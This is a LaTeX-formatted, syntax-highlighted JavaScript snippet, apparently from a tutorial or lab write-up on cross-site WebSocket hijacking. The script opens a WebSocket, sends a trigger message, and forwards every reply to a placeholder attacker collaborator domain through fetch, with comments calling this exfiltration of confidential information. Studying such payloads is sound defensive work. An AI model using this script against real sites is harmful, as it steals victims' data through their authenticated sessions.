\begin{Verbatim}[commandchars=\\\{\}]
	\PYG{o}{\PYGZlt{}}\PYG{n+nx}{script}\PYG{o}{\PYGZgt{}}
	\PYG{n+nx}{websocket} \PYG{o}{=} \PYG{o+ow}{new} \PYG{n+nx}{WebSocket}\PYG{p}{(}\PYG{l+s+s1}{\PYGZsq{}wss://your\PYGZhy{}websocket\PYGZhy{}URL\PYGZsq{}}\PYG{p}{)}
	\PYG{n+nx}{websocket}\PYG{p}{.}\PYG{n+nx}{onopen} \PYG{o}{=} \PYG{n+nx}{start}
	\PYG{n+nx}{websocket}\PYG{p}{.}\PYG{n+nx}{onmessage} \PYG{o}{=} \PYG{n+nx}{handleReply}
	\PYG{k+kd}{function} \PYG{n+nx}{start}\PYG{p}{(}\PYG{n+nx}{event}\PYG{p}{)} \PYG{p}{\PYGZob{}}
	\PYG{n+nx}{websocket}\PYG{p}{.}\PYG{n+nx}{send}\PYG{p}{(}\PYG{l+s+s2}{\PYGZdq{}READY\PYGZdq{}}\PYG{p}{);} \PYG{c+c1}{//Send the message to retrieve confidential information}
	\PYG{p}{\PYGZcb{}}
	\PYG{k+kd}{function} \PYG{n+nx}{handleReply}\PYG{p}{(}\PYG{n+nx}{event}\PYG{p}{)} \PYG{p}{\PYGZob{}}
	\PYG{c+c1}{//Exfiltrate the confidential information to attackers server}
	\PYG{n+nx}{fetch}\PYG{p}{(}\PYG{l+s+s1}{\PYGZsq{}https://your\PYGZhy{}collaborator\PYGZhy{}domain/?\PYGZsq{}}\PYG{o}{+}\PYG{n+nx}{event}\PYG{p}{.}\PYG{n+nx}{data}\PYG{p}{,} \PYG{p}{\PYGZob{}}\PYG{n+nx}{mode}\PYG{o}{:} \PYG{l+s+s1}{\PYGZsq{}no\PYGZhy{}cors\PYGZsq{}}\PYG{p}{\PYGZcb{})}
	\PYG{p}{\PYGZcb{}}
	\PYG{o}{\PYGZlt{}}\PYG{err}{/script\PYGZgt{}}
\end{Verbatim}
